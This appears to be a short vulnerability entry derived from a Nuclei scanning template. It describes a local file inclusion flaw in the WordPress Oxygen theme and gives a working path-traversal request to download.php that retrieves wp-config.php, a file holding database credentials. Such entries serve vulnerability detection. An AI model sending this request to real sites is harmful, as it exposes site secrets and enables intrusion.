# Vulnerability: WordPress Oxygen-Theme - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`wp-oxygen-theme-lfi.yaml`)

## Description
WordPress Oxygen-Theme has a local file inclusion vulnerability via the 'file' parameter of 'download.php'.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/themes/oxygen-theme/download.php?file=../../../wp-config.php
```

